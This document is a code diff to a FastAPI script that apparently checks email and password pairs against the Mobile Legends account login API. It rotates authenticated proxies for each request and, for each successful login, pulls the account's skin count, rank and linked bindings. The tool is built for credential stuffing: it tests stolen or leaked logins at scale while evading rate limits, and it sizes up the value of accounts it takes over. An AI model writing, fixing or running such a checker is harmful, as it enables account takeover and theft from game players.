@@ -1,4 +1,4 @@
-# -------------------- main.py (Fixed Version with Proxy Auth) --------------------
+# -------------------- main.py (Corrected Version for latest httpx) --------------------
 from fastapi import FastAPI, UploadFile, Form, Request
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
@@ -17,30 +17,29 @@ with open("proxies.txt", "r") as f:
     proxies = [p.strip() for p in f if p.strip()]
 
 # Correct proxy formatter
-def get_proxy():
+def get_proxy_url():
     raw = random.choice(proxies)
     ip, port, user, pwd = raw.split(":")
-    return {
-        "http://": f"http://{user}:{pwd}@{ip}:{port}",
-        "https://": f"http://{user}:{pwd}@{ip}:{port}",
-    }
+    return f"http://{user}:{pwd}@{ip}:{port}"
+
+async def get_async_client():
+    proxy_url = get_proxy_url()
+    transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
+    return httpx.AsyncClient(transport=transport, timeout=10)
 
 async def get_profile(access_token, user_id):
     url = "https://accountmtapi.mobilelegends.com/Account/profile"
     headers = {"Authorization": f"Bearer {access_token}"}
     data = {"user_id": user_id, "format": 2}
-    proxy = get_proxy()
 
     try:
-        async with httpx.AsyncClient(proxies=proxy, timeout=10) as client:
+        async with await get_async_client() as client:
             res = await client.post(url, data=data, headers=headers)
             if res.status_code == 200:
                 info = res.json().get("data", {})
                 total_skins = info.get("skin_count", 0)
                 rank = info.get("rank_name", "Unknown")
-                bindings = []
-                for b in info.get("bind_list", []):
-                    bindings.append(b.get("bind_type", "Unknown"))
+                bindings = [b.get("bind_type", "Unknown") for b in info.get("bind_list", [])]
                 return total_skins, rank, bindings
     except Exception as e:
         print(f"Error fetching profile: {e}")
@@ -50,10 +49,9 @@ async def check_account(email, password):
     login_url = "https://accountmtapi.mobilelegends.com/Account/login"
     data = {"email": email, "password": password, "os_type": 2, "format": 2, "secret": ""}
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    proxy = get_proxy()
 
     try:
-        async with httpx.AsyncClient(proxies=proxy, timeout=10) as client:
+        async with await get_async_client() as client:
             res = await client.post(login_url, data=data, headers=headers)
             results["total"] += 1
             if res.status_code == 200 and res.json().get("code") == 200:
